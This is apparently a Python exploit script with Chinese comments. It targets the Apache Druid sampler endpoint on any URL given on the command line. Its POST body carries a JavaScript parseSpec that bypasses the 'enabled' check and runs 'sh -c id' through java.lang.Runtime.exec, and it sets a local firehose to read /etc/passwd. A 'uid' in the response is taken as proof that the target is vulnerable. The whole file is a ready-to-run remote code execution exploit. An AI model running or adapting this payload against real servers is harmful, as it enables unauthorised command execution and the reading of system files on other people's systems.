import requests
import argparse
from faker import Faker

fake = Faker()
# 创建命令行参数解析器
parser = argparse.ArgumentParser(description='向指定 URL 发送 POST 请求。存在问题的路径为 /druid/indexer/v1/sampler',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, help='输入目标 URL 以发送 POST 请求')

args = parser.parse_args()

if args.url:
    if args.url.endswith('/'):
        url = args.url[:-1] + "/druid/indexer/v1/sampler"  # 移除末尾的斜杠
    else:
        url = args.url + "/druid/indexer/v1/sampler"
else:
    print("请使用 -u 或 --url 参数提供有效的 URL。")
    exit()

headers = {
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Accept-Language': 'en-US;q=0.9,en;q=0.8',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36',
    'Connection': 'close',
    'Cache-Control': 'max-age=0',
    'Content-Type': 'application/json'
}

data = {
    "type": "index",
    "spec": {
        "ioConfig": {
            "type": "index",
            "firehose": {
                "type": "local",
                "baseDir": "/etc",
                "filter": "passwd"
            }
        },
        "dataSchema": {
            "dataSource": "test",
            "parser": {
                "parseSpec": {
                    "format": "javascript",
                    "timestampSpec": {},
                    "dimensionsSpec": {},
                    "function": "function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\"sh\",\"-c\",\"id\"]).getInputStream()).useDelimiter(\"\\A\").next();return {timestamp:123123,test: a}}",
                    "": {
                        "enabled": "true"
                    }
                }
            }
        }
    },
    "samplerConfig": {
        "numRows": 10
    }
}

# 发送 POST 请求
response = requests.post(url, headers=headers, json=data)

if "uid" in response.text:
    print(f"目标 URL: {url}\n请求成功\n存在漏洞")
    print(response.text)
else:
    print(f"目标 URL: {url}\n请求失败不存在漏洞，状态码: {response.status_code}")
    # print(response.text)